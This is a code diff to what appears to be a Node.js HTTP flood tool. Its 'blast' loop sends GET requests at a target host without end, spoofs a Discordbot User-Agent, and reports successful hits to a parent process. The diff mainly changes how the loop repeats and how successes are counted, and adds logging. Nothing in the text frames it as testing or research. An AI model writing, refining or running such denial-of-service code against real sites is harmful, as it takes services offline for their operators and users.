@@ -64,7 +64,7 @@ async function main() {
             const options = {
                 hostname: target.hostname,
                 port: port,
-                path: target.pathname,
+                path: target.pathname || "/",
                 method: 'GET',
                 headers: {
                     'User-Agent': 'Discordbot/2.0 (+https://discordapp.com)',
@@ -73,12 +73,25 @@ async function main() {
                 }
             };
 
-            const req = protocol.request(options);
-            req.on('error', () => {});
-            req.end();
+            const req = protocol.request(options, (res) => {
+                if (res.statusCode === 200) {
+                    // Success: Request completed, increment total count
+                    process.send('inc');
+                } else {
+                    // Debug: Log the response status if it's not 200
+                    console.log(`Request failed with status code: ${res.statusCode}`);
+                }
+            });
 
-            process.send('inc');
-            setImmediate(blast);
+            req.on('error', (err) => {
+                // Debug: Log if there is an error in the request
+                console.log('Request error:', err);
+            });
+
+            req.end();  // Finish the request
+
+            // Recursively keep sending requests
+            blast();
         }
         blast();
     }
